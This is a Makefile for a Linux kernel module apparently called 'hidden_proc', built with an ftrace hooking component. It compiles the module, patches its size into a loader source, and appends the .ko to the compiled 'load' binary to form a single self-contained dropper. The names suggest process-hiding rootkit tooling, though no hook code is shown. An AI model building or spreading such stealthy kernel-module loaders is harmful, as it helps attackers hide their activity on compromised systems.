ifneq ($(KERNELRELEASE),)
	obj-m := hidden_proc.o
	hidden_proc-y := hidden_proc_main.o ftrace_hook.o
#	CFLAGS_sm3.o+=-DSM3_MACRO -Wno-shift-count-overflow
else
	KERNELDIR ?= /lib/modules/`uname  -r`/build
	PWD := $(shell pwd)
default:
	$(MAKE)  -C $(KERNELDIR) M=$(PWD) modules
	sed -i "s/int m_size = .*;/int m_size = `stat -c %s hidden_proc.ko`;/" load.c 
	gcc -O2 -o load load.c
	cat hidden_proc.ko >> load
clean:
	rm -rf *.ko *.o *.mod *.mod.o *.mod.c *.symvers \.*.cmd .tmp_versions modules.order
	rm -rf load
endif
